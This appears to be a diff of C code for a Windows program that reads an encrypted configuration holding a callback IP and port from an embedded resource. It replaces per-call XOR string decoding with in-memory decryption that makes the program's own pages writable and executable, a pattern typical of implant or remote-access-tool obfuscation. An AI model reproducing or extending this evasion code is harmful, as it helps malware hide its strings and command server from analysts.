@@ -79,29 +79,6 @@ void str_trim(char* s) {
     memmove(s, p, l + 1);
 }
 
-unsigned char g_xor_key[5] = XOR_KEY_MARKER "\x00";
-
-char* xor_str(const char* str) {
-    if (memcmp(str, XOR_PROCESSED_MARKER, 4) != 0) return (char*)str;
-
-    static __thread char pools[32][1024];
-    static __thread int pool_idx = 0;
-
-    char* buf = pools[pool_idx];
-    pool_idx = (pool_idx + 1) % 32;
-
-    int len = (unsigned char)str[4];
-    const char* data = str + 5;
-    unsigned char key = g_xor_key[4];
-
-    for (int i = 0; i < len; i++) {
-        buf[i] = data[i] ^ key;
-    }
-    buf[len] = '\0';
-
-    return buf;
-}
-
 extern SessionKey g_session;
 
 void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
@@ -315,6 +292,50 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
 char g_host[256] = {0};
 int g_port = 0;
 
+unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};
+
+void transparent_decryption() {
+    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
+    if (!hRes) return;
+
+    HGLOBAL hData = LoadResource(NULL, hRes);
+    if (!hData) return;
+
+    unsigned char* pData = (unsigned char*)LockResource(hData);
+    if (!pData) return;
+
+    unsigned char marker[16];
+    SET_MARKER(marker);
+
+    if (memcmp(pData, marker, 16) != 0) return;
+
+    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...]
+    // StringTableEntry: [RVA(4)][Len(4)]
+
+    int num_strings = *(int*)(pData + 16 + 2032);
+    if (num_strings <= 0) return;
+
+    unsigned char* string_table = pData + 16 + 2032 + 4;
+    unsigned char key = g_xor_key[4];
+    if (key == 0) return; // Not obfuscated
+
+    HMODULE hMod = GetModuleHandle(NULL);
+    for (int i = 0; i < num_strings; i++) {
+        DWORD rva = *(DWORD*)(string_table + (i * 8));
+        DWORD len = *(DWORD*)(string_table + (i * 8) + 4);
+
+        unsigned char* addr = (unsigned char*)hMod + rva;
+
+        DWORD old_protect;
+        if (VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old_protect)) {
+            for (DWORD j = 0; j < len; j++) {
+                addr[j] ^= key;
+            }
+            VirtualProtect(addr, len, old_protect, &old_protect);
+        }
+    }
+}
+
 void load_config_from_resource() {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
     if (!hRes) return;
@@ -365,8 +386,8 @@ void load_config_from_resource() {
         pbPlain[cbResult] = 0;
         cJSON* root = cJSON_Parse((char*)pbPlain);
         if (root) {
-            cJSON* ip = cJSON_GetObjectItem(root, xor_str(_S("ip")));
-            cJSON* port = cJSON_GetObjectItem(root, xor_str(_S("port")));
+            cJSON* ip = cJSON_GetObjectItem(root, "ip");
+            cJSON* port = cJSON_GetObjectItem(root, "port");
             if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
             if (port) g_port = port->valueint;
             cJSON_Delete(root);
